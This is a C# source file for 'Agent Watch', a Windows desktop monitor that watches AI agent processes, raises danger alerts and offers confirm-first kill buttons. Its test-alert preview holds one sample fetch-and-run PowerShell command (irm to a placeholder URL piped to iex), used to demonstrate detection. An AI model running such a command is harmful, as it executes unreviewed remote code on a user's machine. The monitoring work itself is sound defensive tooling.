using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Markup;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Effects;
using System.Windows.Shapes;
using System.Windows.Shell;
using System.Windows.Threading;
using WF = System.Windows.Forms;
using SD = System.Drawing;
using Path = System.IO.Path;

namespace AgentWatch
{
    partial class MainWin
    {
        Dictionary<int, List<IntPtr>> winCache; DateTime winCacheAt = DateTime.MinValue;
        Dictionary<int, List<IntPtr>> Wins() { if (winCache == null || (DateTime.Now - winCacheAt).TotalSeconds > 2) { winCache = N2.WindowsByPid(); winCacheAt = DateTime.Now; } return winCache; }
        IntPtr WindowOfTree(PInfo p, int depth)
        {
            if (p == null || depth > 12) return IntPtr.Zero;
            List<IntPtr> l; if (Wins().TryGetValue(p.Pid, out l) && l.Count > 0) return l[0];
            foreach (var k in p.Kids) { var h = WindowOfTree(k, depth + 1); if (h != IntPtr.Zero) return h; }
            return IntPtr.Zero;
        }
        string lastLogLine; DateTime lastLogAt = DateTime.MinValue;
        string LatestAction(string app)
        {
            if (app != "OpenBot") return "no action log for " + app;
            if ((DateTime.Now - lastLogAt).TotalSeconds > 4)
            {
                lastLogAt = DateTime.Now; lastLogLine = null;
                try
                {
                    var tl = LogPeek.Tail(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"OpenBot\logs\remote\cua-driver.log"), 4096);
                    for (int i = tl.Count - 1; i >= 0; i--)
                    {
                        var l = System.Text.RegularExpressions.Regex.Replace(tl[i], @"\x1b\[[0-9;]*m", "").Trim();
                        if (l.Length > 0) { lastLogLine = l.Length > 28 ? l.Substring(28).Trim() : l; break; }
                    }
                }
                catch { }
                if (lastLogLine != null) lastLogLine = Redactor.Clean(lastLogLine, 110);
            }
            return lastLogLine ?? "nothing logged yet";
        }

        void Chip(string text, Brush back, Brush fore)
        {
            var b = new Border { CornerRadius = new CornerRadius(10), Padding = new Thickness(9, 2, 9, 3), Margin = new Thickness(0, 0, 6, 4), Background = back };
            b.Child = new TextBlock { Text = text, FontSize = 11.5, Foreground = fore, TextTrimming = TextTrimming.CharacterEllipsis, MaxWidth = 560 };
            chips.Children.Add(b);
        }

        void UpdateHeader()
        {
            Brush soft = R("AccentSoft"), txt = R("Text");
            var dh = danger.Active(eng);
            bool pv = preview != EyeMode.Idle && DateTime.Now < previewUntil;
            if (!pv && preview != EyeMode.Idle) { preview = EyeMode.Idle; foreach (var h0 in danger.Hits) if (h0.Test) h0.Dismissed = true; dh = danger.Active(eng); }
            Episode ep = null; foreach (var e in eng.OpenEpisodes.Values) { ep = e; break; }
            PInfo app = null;
            foreach (var a in eng.AgentApps)
            {
                bool fresh = (DateTime.Now - a.StartLocal).TotalSeconds < 120, busy = (DateTime.Now - a.LastBusy).TotalSeconds < 20;
                if (fresh || busy) { if (app == null || a.Create > app.Create) app = a; }
            }
            EyeMode mode = dh != null ? EyeMode.Danger : (ep != null || app != null || eng.RemoteSessions.Count > 0) ? EyeMode.Nervous : EyeMode.Idle;
            if (pv && preview > mode) mode = preview;
            if (mode != EyeMode.Danger && shownDanger != null) HideDanger();
            eyes.Mode = mode;
            chips.Children.Clear();
            Rect? target = null;
            IntPtr fg = Native.GetForegroundWindow();
            if (mode == EyeMode.Danger)
            {
                var h = dh;
                IntPtr w = h != null && h.Hwnd != IntPtr.Zero ? h.Hwnd : (h != null && h.P != null ? WindowOfTree(h.P, 0) : fg);
                if (w == hwnd) w = IntPtr.Zero;
                target = N2.ScreenRect(w);
                headMain.Text = h != null ? (h.Test ? "TEST - " : "DANGER: ") + h.Agent + " - " + h.Title : "DANGER";
                headSub.Text = h != null ? h.Snippet : "";
                if (h != null)
                {
                    Chip(h.ProcName + " PID " + h.Pid, RedRow, RedText); Chip(h.App, RedRow, RedText);
                    if (w != IntPtr.Zero) Chip("window \"" + Native.WinText(w) + "\"", RedRow, RedText);
                    Chip("seen " + h.When.ToString("h:mm:ss tt") + " ET", RedRow, RedText);
                    if (h.Test) Chip("preview - nothing is wrong", soft, txt);
                }
                statePill.Background = RedB; stateText.Text = "DANGER"; stateText.Foreground = White; stateSince.Text = h != null ? "since " + h.When.ToString("h:mm:ss tt") : "";
                headerGlow.Background = new LinearGradientBrush(Theme.Hex("#70F43F5E"), Theme.Hex("#00F43F5E"), 0);
                if (h != null && shownDanger != h && !h.Dismissed) ShowDanger(h);
            }
            else if (mode == EyeMode.Nervous)
            {
                if (ep != null || (pv && app == null))
                {
                    string who = ep != null ? ep.Agent : "OpenBot (Gemini)", tgt = ep != null ? (ep.Target ?? "the screen") : "your screen (preview)";
                    PInfo cp = null; if (ep != null) eng.All.TryGetValue(ep.Pid, out cp);
                    headMain.Text = who + " is controlling " + tgt;
                    string title = fg != hwnd ? Native.WinText(fg) : "";
                    headSub.Text = (title.Length > 0 ? "Window \"" + title + "\"  ·  " : "") + (ep != null ? "for " + Words.Dur(DateTime.Now - ep.Start) + "  ·  " + ep.Proc + " PID " + ep.Pid + (cp != null ? string.Format("  ·  {0:0.0}% CPU", cp.Cpu) : "") : "Preview of the bot-detected look. Nothing is controlling your screen.");
                    if (ep != null) { Chip("Latest: " + LatestAction(ep.App), AmberRow, AmberText); Chip("Sub-agent: " + ep.Agent, soft, txt); Chip("App: " + ep.App, soft, txt); }
                    else Chip("Eyes point at the window in front", soft, txt);
                    target = fg != hwnd ? N2.ScreenRect(fg) : null;
                    if (target == null && app != null) target = N2.ScreenRect(WindowOfTree(app, 0));
                    stateSince.Text = ep != null ? "since " + ep.Start.ToString("h:mm:ss tt") : "preview";
                }
                else if (app != null)
                {
                    headMain.Text = app.AppAgent + " opened " + app.AppName;
                    headSub.Text = (app.WinTitle != null ? "Window \"" + app.WinTitle + "\"  ·  " : "No window (background)  ·  ") + "open " + Words.Dur(DateTime.Now - app.StartLocal) + "  ·  " + app.Name + " PID " + app.Pid + string.Format("  ·  {0:0.0}% CPU", app.Cpu);
                    var ph = Words.AppPhrases(eng.AgentApps); if (ph.Count > 0) Chip(ph[0], AmberRow, AmberText);
                    if (app.Parent != null) { string ss = app.Parent.Cmd != null ? Engine.ShellSummary(app.Parent) : null; Chip("started by " + app.Parent.Name + " (PID " + app.Parent.Pid + ")" + (ss != null ? ": " + ss : ""), soft, txt); }
                    target = N2.ScreenRect(WindowOfTree(app, 0));
                    stateSince.Text = "since " + app.StartLocal.ToString("h:mm:ss tt");
                }
                else { headMain.Text = eng.RemoteSessions.Count > 0 ? eng.RemoteSessions[0] : "Bot activity"; headSub.Text = headlineText; stateSince.Text = ""; }
                statePill.Background = Amber; stateText.Text = "BOT ACTIVE"; stateText.Foreground = Dark;
                headerGlow.Background = new LinearGradientBrush(Theme.Hex("#48F59E0B"), Theme.Hex("#00F59E0B"), 0); headerGlow.Opacity = 1;
            }
            else
            {
                string first = headlineText, rest = "";
                if (eng.AgentApps.Count > 0)
                {
                    var ph = Words.AppPhrases(eng.AgentApps); first = ph[0] + ".";
                    int cut = Math.Min(headlineText.Length, string.Join(". ", ph).Length + 2); rest = headlineText.Substring(cut);
                }
                else { int dot = first.IndexOf(". "); if (dot > 0) { rest = first.Substring(dot + 2); first = first.Substring(0, dot + 1); } }
                headMain.Text = first; headSub.Text = rest;
                int ai = 0, idleC = 0; foreach (var g in groups) { if (g.Category == "agent") ai++; idleC += g.IdleCtrls.Count; }
                Chip(ai + " agent app" + (ai == 1 ? "" : "s") + " open", soft, txt);
                if (idleC > 0) Chip(idleC + " screen helper" + (idleC == 1 ? "" : "s") + " loaded, idle", soft, txt);
                if (eng.AgentApps.Count > 0) Chip(eng.AgentApps.Count + " app" + (eng.AgentApps.Count == 1 ? "" : "s") + " opened by agents", AmberRow, AmberText);
                if (eng.History.Count > 0) { var e = eng.History[0]; Chip("Last: " + e.Agent + " - " + e.What.Replace(" (still open)", "") + ", " + e.Start.ToString("MMM d h:mm tt"), soft, txt); }
                statePill.Background = soft; stateText.Text = "WATCHING"; stateText.Foreground = txt; stateSince.Text = "eyes on " + groups.Count + " app" + (groups.Count == 1 ? "" : "s");
                headerGlow.Opacity = 0;
            }
            eyes.Target = target;
        }

        // ---------- danger popup ----------
        void ShowDanger(DangerHit h)
        {
            shownDanger = h; dangerBody.Children.Clear();
            var top = new StackPanel { Orientation = Orientation.Horizontal };
            top.Children.Add(new TextBlock { Text = "\uE7BA", FontFamily = new FontFamily("Segoe MDL2 Assets"), FontSize = 28, Foreground = RedText, Margin = new Thickness(0, 0, 12, 0), VerticalAlignment = VerticalAlignment.Center });
            top.Children.Add(new TextBlock { Text = (h.Test ? "TEST ALERT - " : "") + h.Title, FontSize = 20, FontWeight = FontWeights.Bold, Foreground = White, TextWrapping = TextWrapping.Wrap, MaxWidth = 470, VerticalAlignment = VerticalAlignment.Center });
            dangerBody.Children.Add(top);
            Action<string, string> line = (k, val) =>
            {
                if (string.IsNullOrEmpty(val)) return;
                var g = new Grid { Margin = new Thickness(0, 6, 0, 0) }; g.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(110) }); g.ColumnDefinitions.Add(new ColumnDefinition());
                g.Children.Add(new TextBlock { Text = k, Foreground = RedText, FontWeight = FontWeights.SemiBold });
                var tb = new TextBox { Text = val, Style = St("SelText"), Foreground = White }; Grid.SetColumn(tb, 1); g.Children.Add(tb);
                dangerBody.Children.Add(g);
            };
            dangerBody.Children.Add(new Border { Height = 8 });
            line("Agent", h.Agent); line("App", h.App); line("Process", h.ProcName + "  (PID " + h.Pid + ")");
            if (h.P != null) { var chain = new List<string>(); for (var a = h.P.Parent; a != null && chain.Count < 6; a = a.Parent) chain.Add(a.Name + " (" + a.Pid + ")"); line("Process tree", h.ProcName + "  <  " + string.Join("  <  ", chain)); }
            IntPtr w = h.Hwnd != IntPtr.Zero ? h.Hwnd : h.P != null ? WindowOfTree(h.P, 0) : IntPtr.Zero;
            line("Window", h.Window ?? (w != IntPtr.Zero ? Native.WinText(w) : null));
            line("What it ran", h.Snippet); line("Why flagged", h.Why); line("What to do", h.Todo);
            line("When", h.When.ToString("h:mm:ss tt") + " ET");
            var bar = new WrapPanel { Margin = new Thickness(0, 16, 0, 0) };
            var kill = new Button { Content = "Kill process", Style = St("DangerBtn"), Padding = new Thickness(20, 10, 20, 10), FontSize = 15 };
            var killTree = new Button { Content = "Kill app tree", Style = St("DangerBtn"), Padding = new Thickness(20, 10, 20, 10), FontSize = 15 };
            var front = new Button { Content = "Bring to front", Style = St("Btn"), Padding = new Thickness(14, 10, 14, 10) };
            var dismiss = new Button { Content = h.Test ? "End test" : "Ignore / dismiss", Style = St("Btn"), Padding = new Thickness(14, 10, 14, 10) };
            if (h.Test || h.P == null) { kill.IsEnabled = false; killTree.IsEnabled = false; }
            kill.Click += delegate { if (h.P != null) AskKill(h.P, false); };
            killTree.Click += delegate { if (h.P != null) AskKill(h.P, true); };
            front.IsEnabled = w != IntPtr.Zero && w != hwnd;
            front.Click += delegate { if (w != IntPtr.Zero && w != hwnd) N2.Front(w); };
            dismiss.Click += delegate
            {
                h.Dismissed = true; if (h.Test) { preview = EyeMode.Idle; previewUntil = DateTime.MinValue; }
                else Logger.Event("DANGER  | dismissed by user | " + h.Title + " | PID " + h.Pid);
                HideDanger(); UpdateHeader();
            };
            bar.Children.Add(kill); bar.Children.Add(killTree); bar.Children.Add(front); bar.Children.Add(dismiss);
            dangerBody.Children.Add(bar);
            dangerBody.Children.Add(new TextBlock { Text = h.Test ? "This is a preview. Kill buttons are disabled and nothing will be stopped." : "Agent Watch never kills anything on its own. Kill asks you to confirm first.", Foreground = RedText, Margin = new Thickness(0, 4, 0, 0), FontSize = 12, TextWrapping = TextWrapping.Wrap });
            dangerPop.Visibility = Visibility.Visible;
            dangerPop.BeginAnimation(OpacityProperty, new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(220)));
        }
        void HideDanger() { dangerPop.Visibility = Visibility.Collapsed; shownDanger = null; }

        public void StartPreview(EyeMode m)
        {
            preview = m; previewUntil = DateTime.Now.AddSeconds(m == EyeMode.Danger ? 45 : 20);
            if (m == EyeMode.Danger)
            {
                foreach (var h0 in danger.Hits) if (h0.Test) h0.Dismissed = true;
                IntPtr fg = Native.GetForegroundWindow(); if (fg == hwnd) fg = IntPtr.Zero;
                string t = fg != IntPtr.Zero ? Native.WinText(fg) : "";
                var h = new DangerHit { Title = "Downloading and running code from the internet", Agent = "OpenBot (Gemini)", App = "OpenBot", ProcName = "powershell.exe", Pid = 0, When = DateTime.Now,
                    Snippet = "powershell -c \"irm https://example.invalid/install.ps1 | iex\"   (sample command, not real)", Why = "An agent command downloads a script and runs it straight away, with no chance to review it.",
                    Todo = "In a real alert: kill it unless you trust the exact URL.", Hwnd = fg, Window = t.Length > 0 ? t : null, Key = "test" + DateTime.Now.Ticks };
                danger.AddTest(h);
            }
            UpdateHeader();
        }
        void StopPreview() { eyes.PreviewMood(Mood.Normal, 0); preview = EyeMode.Idle; previewUntil = DateTime.MinValue; foreach (var h in danger.Hits) if (h.Test) h.Dismissed = true; HideDanger(); UpdateHeader(); }

        // ---------- details pane ----------
        TextBlock H2(string t) { return new TextBlock { Text = t.ToUpper(), FontSize = 11, FontWeight = FontWeights.Bold, Foreground = R("Dim"), Margin = new Thickness(0, 14, 0, 4) }; }
        TextBox Para(string t) { return new TextBox { Text = t ?? "", Style = St("SelText"), Margin = new Thickness(0, 0, 0, 2) }; }
        void Fact(Grid g, string k, string v)
        {
            int r = g.RowDefinitions.Count; g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            var kt = new TextBlock { Text = k, Foreground = R("Dim"), Margin = new Thickness(0, 3, 10, 3), FontSize = 12.5 }; Grid.SetRow(kt, r); g.Children.Add(kt);
            var vt = new TextBox { Text = v ?? "", Style = St("SelText"), Margin = new Thickness(0, 3, 0, 3), FontSize = 12.5 }; Grid.SetRow(vt, r); Grid.SetColumn(vt, 1); g.Children.Add(vt);
        }
        Grid Facts() { var g = new Grid(); g.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(100) }); g.ColumnDefinitions.Add(new ColumnDefinition()); return g; }
        Button Act(WrapPanel w, string text, string glyph, bool dangerStyle, Action a)
        {
            var sp = new StackPanel { Orientation = Orientation.Horizontal };
            sp.Children.Add(new TextBlock { Text = glyph, FontFamily = new FontFamily("Segoe MDL2 Assets"), FontSize = 12, Margin = new Thickness(0, 1, 7, 0), VerticalAlignment = VerticalAlignment.Center, Foreground = dangerStyle ? White : R("Text") });
            sp.Children.Add(new TextBlock { Text = text, VerticalAlignment = VerticalAlignment.Center, Foreground = dangerStyle ? White : R("Text") });
            var b = new Button { Content = sp, Style = St(dangerStyle ? "DangerBtn" : "Btn") };
            b.Click += delegate { a(); }; w.Children.Add(b); return b;
        }
        Border Badge(string text, Brush back, Brush fore)
        {
            var b = new Border { Style = St("Pill"), Background = back, Padding = new Thickness(10, 3, 10, 4), CornerRadius = new CornerRadius(11), Margin = new Thickness(0, 8, 0, 4) };
            b.Child = new TextBlock { Text = text, Foreground = fore, FontWeight = FontWeights.Bold, FontSize = 12 }; return b;
        }

        static string Chain(PInfo p)
        {
            var l = new List<string>(); int g = 0;
            for (var a = p.Parent; a != null && g < 10; a = a.Parent, g++) l.Add(a.Name + " (" + a.Pid + ")");
            if (p.Parent == null) l.Add("gone (PID " + p.Ppid + ")");
            return string.Join("  <  ", l);
        }
        static string Reason(PInfo p)
        {
            if (p.C != null && p.C.Role == Role.Controller) return p.Active ? "A screen-control helper is active right now" + (string.IsNullOrEmpty(p.ActiveReason) ? "." : ": " + p.ActiveReason + ".") : "A screen-control helper is loaded. It can move the mouse and type, but it is idle right now.";
            if (p.AgentApp) return p.Lv == Level.Red ? "An agent opened this app and a screen helper is driving it now." : "An agent opened this app. Agent-launched apps are never green.";
            if (p.E == null && p.C == null) return "Not in explanations.json yet, so Agent Watch can't say what it is.";
            if (p.Lv == Level.Yellow) return "It can act on your behalf (run commands, call tools, or reach the network).";
            return "A normal helper part of the app.";
        }
        static void Subtree(PInfo p, List<PInfo> outl, int d) { outl.Add(p); if (d < 40) foreach (var k in p.Kids) Subtree(k, outl, d + 1); }

        string copyText = "";
        void ShowDetails(bool force)
        {
            var vm = rows.SelectedItem as VM ?? hist.SelectedItem as VM;
            string key = vm == null ? null : vm.Key;
            if (!force && key == detKey) { RefreshLive(vm); return; }
            if (!force && vm != null && vm.P != null && key == detKey) return;
            detKey = key; detAt = DateTime.Now; det.Children.Clear(); detLive = null;
            if (vm == null)
            {
                det.Children.Add(new TextBlock { Text = "Pick a row", FontSize = 18, FontWeight = FontWeights.SemiBold });
                det.Children.Add(Para("Click any app or process to see what it is, who started it, its command line (secrets blanked), CPU, RAM, windows, network connections, and its risk with the reason.\n\nClick the arrow, double-click, or press Right / Left to expand and collapse an app's process tree.\n\nActions: kill a process or a whole app tree (always asks first), open its file location, copy the details, or bring its window to the front."));
                return;
            }
            var sb = new StringBuilder();
            if (vm.Ep != null)
            {
                var e = vm.Ep;
                bool redK = e.Kind == "danger" || (e.Open && e.Kind != "app");
                det.Children.Add(new TextBlock { Text = e.What, FontSize = 18, FontWeight = FontWeights.SemiBold, TextWrapping = TextWrapping.Wrap });
                det.Children.Add(Badge(e.Kind == "danger" ? "DANGER RULE" : e.Open ? (e.Kind == "app" ? "YELLOW - app still open" : "RED - happening now") : "PAST", redK ? RedB : e.Open ? YelB : UnkB, redK ? White : Dark));
                var f = Facts(); Fact(f, "Who", e.Agent); Fact(f, "App", e.App); Fact(f, "Process", e.Proc + " (PID " + e.Pid + ")"); Fact(f, "Started", e.Start.ToString("MMM d, h:mm:ss tt") + " ET");
                Fact(f, "Ended", e.Open ? "still going" : e.End.ToString("h:mm:ss tt") + " ET"); Fact(f, "How", e.Trigger); Fact(f, "Detail", string.IsNullOrEmpty(e.Detail) ? "(none logged)" : e.Detail);
                det.Children.Add(f);
                sb.AppendFormat("{0}\r\nWho: {1}\r\nApp: {2}\r\nProcess: {3} PID {4}\r\nStarted: {5}\r\nEnded: {6}\r\nHow: {7}\r\nDetail: {8}\r\n", e.What, e.Agent, e.App, e.Proc, e.Pid, e.Start, e.Open ? "still going" : e.End.ToString(), e.Trigger, e.Detail);
                var w = new WrapPanel { Margin = new Thickness(0, 14, 0, 0) };
                PInfo live; bool alive = eng.All.TryGetValue(e.Pid, out live);
                IntPtr hw = alive ? WindowOfTree(live, 0) : IntPtr.Zero;
                Act(w, "Bring to front", "\uE8A7", false, delegate { if (hw != IntPtr.Zero) N2.Front(hw); }).IsEnabled = hw != IntPtr.Zero;
                Act(w, "Copy details", "\uE8C8", false, delegate { try { Clipboard.SetText(copyText); } catch { } });
                Act(w, "Open logs", "\uE838", false, delegate { OpenLogs(); });
                det.Children.Add(w);
            }
            else if (vm.G != null)
            {
                var g = vm.G; var re = g.Roots.Count > 0 ? g.Roots[0].E : null;
                det.Children.Add(new TextBlock { Text = g.App, FontSize = 20, FontWeight = FontWeights.SemiBold });
                det.Children.Add(new TextBlock { Text = g.Procs.Count + " processes  ·  category: " + g.Category, Foreground = R("Dim") });
                det.Children.Add(Badge(vm.Pill, vm.PillBack, vm.PillFore));
                det.Children.Add(Para(g.Lv == Level.Red ? "Why red: a screen-control helper in this app is active right now." : g.Apps.Count > 0 ? "Why yellow: one of its agents opened another app (" + g.Apps[0].AppName + ")." : g.IdleCtrls.Count > 0 ? "Why yellow: it has a screen-control helper loaded (idle)." : g.Lv == Level.Yellow ? "Why yellow: it has parts that can act for you (commands, tools, network)." : "Why green: nothing here can act for you right now."));
                var w = new WrapPanel { Margin = new Thickness(0, 10, 0, 0) };
                Act(w, vm.Expanded ? "Collapse tree" : "Expand tree", vm.Expanded ? "\uE70E" : "\uE70D", false, delegate { Toggle(vm); ShowDetails(true); });
                Act(w, "Kill whole app", "\uE711", true, delegate { AskKillApp(g.App); });
                IntPtr hw = IntPtr.Zero; foreach (var r in g.Roots) { hw = WindowOfTree(r, 0); if (hw != IntPtr.Zero) break; }
                Act(w, "Bring to front", "\uE8A7", false, delegate { if (hw != IntPtr.Zero) N2.Front(hw); }).IsEnabled = hw != IntPtr.Zero;
                if (g.Roots.Count > 0 && g.Roots[0].Path != null) { string pth = g.Roots[0].Path; Act(w, "Open file location", "\uE838", false, delegate { try { Process.Start("explorer.exe", "/select,\"" + pth + "\""); } catch { } }); }
                Act(w, "Copy details", "\uE8C8", false, delegate { try { Clipboard.SetText(copyText); } catch { } });
                det.Children.Add(w);
                det.Children.Add(H2("Doing now")); detLive = new TextBlock { Text = g.Doing, TextWrapping = TextWrapping.Wrap, FontWeight = FontWeights.SemiBold }; det.Children.Add(detLive);
                det.Children.Add(Para(g.Sentence));
                if (re != null)
                {
                    if (re.What != null) { det.Children.Add(H2("What it is")); det.Children.Add(Para(re.What)); }
                    if (re.Why != null) { det.Children.Add(H2("Why it's running")); det.Children.Add(Para(re.Why)); }
                    if (re.Todo != null) { det.Children.Add(H2("What to do")); det.Children.Add(Para(re.Todo)); }
                }
                det.Children.Add(H2("What's inside"));
                var counts = new Dictionary<string, int>(); var order = new List<string>();
                foreach (var p in g.Procs)
                {
                    string k = Words.Fr(p) + "  -  " + (p.C != null && p.C.Role == Role.Controller ? (p.Active ? "RED, active" : "YELLOW, idle") : p.E == null && p.C == null ? "unknown" : Words.LevelWord(p.Lv).ToLower());
                    if (!counts.ContainsKey(k)) { counts[k] = 0; order.Add(k); } counts[k]++;
                }
                var inside = new StringBuilder(); foreach (var k in order) inside.AppendFormat("•  {0}{1}\n", k, counts[k] > 1 ? "  ×" + counts[k] : "");
                det.Children.Add(Para(inside.ToString().TrimEnd()));
                var f = Facts(); Fact(f, "CPU", g.Cpu.ToString("0.0") + "%"); Fact(f, "RAM", g.Ram.ToString("0") + " MB");
                if (g.Roots.Count > 0) { Fact(f, "Main process", g.Roots[0].Name + " (PID " + g.Roots[0].Pid + ")"); Fact(f, "Path", g.Roots[0].Path ?? "(hidden)"); Fact(f, "Started", g.Roots[0].StartLocal.ToString("MMM d, h:mm:ss tt") + " ET"); }
                var pids = new HashSet<int>(); foreach (var p in g.Procs) pids.Add(p.Pid);
                int lis, tot; var con = N2.Tcp(pids, out lis, out tot);
                Fact(f, "Network", tot == 0 ? "no IPv4 TCP connections" : string.Format("{0} TCP connection{1} ({2} listening){3}", tot, tot == 1 ? "" : "s", lis, con.Count > 0 ? "\nconnected to: " + string.Join(", ", con) : ""));
                det.Children.Add(H2("Facts")); det.Children.Add(f);
                sb.AppendFormat("{0} ({1} processes)\r\nRisk: {2}\r\nDoing: {3}\r\n{4}\r\n\r\n{5}", g.App, g.Procs.Count, vm.Pill, g.Doing, g.Sentence, inside);
            }
            else if (vm.P != null)
            {
                var p = vm.P; var e = p.E;
                det.Children.Add(new TextBlock { Text = p.AgentApp ? p.AppName + " - opened by " + p.AppAgent : (e != null && e.Friendly != null ? e.Friendly : p.Name), FontSize = 18, FontWeight = FontWeights.SemiBold, TextWrapping = TextWrapping.Wrap });
                det.Children.Add(new TextBlock { Text = p.Name + "  ·  PID " + p.Pid + "  ·  part of " + Engine.AppOf(p), Foreground = R("Dim"), TextWrapping = TextWrapping.Wrap });
                det.Children.Add(Badge(vm.Pill, vm.PillBack, vm.PillFore));
                det.Children.Add(Para("Why: " + Reason(p)));
                var w = new WrapPanel { Margin = new Thickness(0, 10, 0, 0) };
                Act(w, "Kill process", "\uE711", true, delegate { AskKill(p, false); });
                Act(w, "Kill whole tree", "\uE74D", true, delegate { AskKill(p, true); });
                IntPtr hw = WindowOfTree(p, 0);
                Act(w, "Bring to front", "\uE8A7", false, delegate { if (hw != IntPtr.Zero) N2.Front(hw); }).IsEnabled = hw != IntPtr.Zero;
                if (p.Path != null) Act(w, "Open file location", "\uE838", false, delegate { try { Process.Start("explorer.exe", "/select,\"" + p.Path + "\""); } catch { } });
                Act(w, "Copy details", "\uE8C8", false, delegate { try { Clipboard.SetText(copyText); } catch { } });
                if (e == null && !p.AgentApp) Act(w, "Add note", "\uE70F", false, delegate { AddNote(p); });
                det.Children.Add(w);
                det.Children.Add(H2("Doing now")); detLive = new TextBlock { Text = vm.Doing, TextWrapping = TextWrapping.Wrap, FontWeight = FontWeights.SemiBold }; det.Children.Add(detLive);
                foreach (var dh in danger.Hits) if (dh.P == p && !dh.Test) { det.Children.Add(Badge("DANGER: " + dh.Title, RedB, White)); det.Children.Add(Para(dh.Snippet)); }
                if (e != null)
                {
                    if (e.What != null) { det.Children.Add(H2("What it does")); det.Children.Add(Para(e.What)); }
                    if (e.Why != null) { det.Children.Add(H2("Why it's running")); det.Children.Add(Para(e.Why)); }
                    if (e.Todo != null) { det.Children.Add(H2("What to do")); det.Children.Add(Para(e.Todo)); }
                }
                var f = Facts();
                Fact(f, "Started", p.Create > 0 ? p.StartLocal.ToString("MMM d, h:mm:ss tt") + " ET" : "?");
                Fact(f, "CPU / RAM", string.Format("{0:0.0}%  /  {1:0} MB", p.Cpu, p.RamMB));
                Fact(f, "Parent chain", Chain(p));
                var all = new List<PInfo>(); Subtree(p, all, 0);
                Fact(f, "Children", (all.Count - 1) + " process" + (all.Count == 2 ? "" : "es") + " below it");
                Fact(f, "Path", p.Path ?? "(hidden)");
                Fact(f, "Command", string.IsNullOrEmpty(p.Cmd) ? "(not readable)" : Redactor.Clean(p.Cmd, 1500));
                var wl = new List<string>(); List<IntPtr> hs; if (Wins().TryGetValue(p.Pid, out hs)) foreach (var h in hs) { if (wl.Count < 6) wl.Add("\"" + Native.WinText(h) + "\""); }
                Fact(f, "Windows", wl.Count > 0 ? string.Join("\n", wl) : "none of its own");
                int lis, tot; var set = new HashSet<int>(); set.Add(p.Pid);
                var con = N2.Tcp(set, out lis, out tot);
                Fact(f, "Network", tot == 0 ? "no IPv4 TCP connections" : string.Format("{0} TCP connection{1} ({2} listening){3}", tot, tot == 1 ? "" : "s", lis, con.Count > 0 ? "\nconnected to: " + string.Join(", ", con) : ""));
                det.Children.Add(H2("Facts")); det.Children.Add(f);
                sb.AppendFormat("{0} PID {1} (part of {2})\r\nRisk: {3} - {4}\r\nDoing: {5}\r\nStarted: {6}\r\nCPU {7:0.0}% RAM {8:0} MB\r\nParents: {9}\r\nPath: {10}\r\nCommand: {11}\r\n",
                    p.Name, p.Pid, Engine.AppOf(p), vm.Pill, Reason(p), vm.Doing, p.StartLocal, p.Cpu, p.RamMB, Chain(p), p.Path, Redactor.Clean(p.Cmd, 1500));
            }
            copyText = sb.ToString();
        }
        void RefreshLive(VM vm)
        {
            if (vm == null || detLive == null || vm.Ep != null) return;
            string t = vm.G != null ? vm.G.Doing : vm.Doing;
            if (t != null && detLive.Text != t) detLive.Text = t;
        }

        void AddNote(PInfo p)
        {
            try
            {
                string id = eng.X.AddStub(p, Engine.AppOf(p)); eng.X.CheckReload();
                ShowConfirm("Note added", "Added a stub rule (" + id + ") for " + p.Name + " to explanations.json.\n\nOpen the file now to describe it?", "Open file", delegate { try { Process.Start("notepad.exe", "\"" + Explainer.FilePath + "\""); } catch { } }, false);
            }
            catch (Exception ex) { ShowConfirm("Could not add the note", ex.Message, null, null, false); }
        }
    }
}
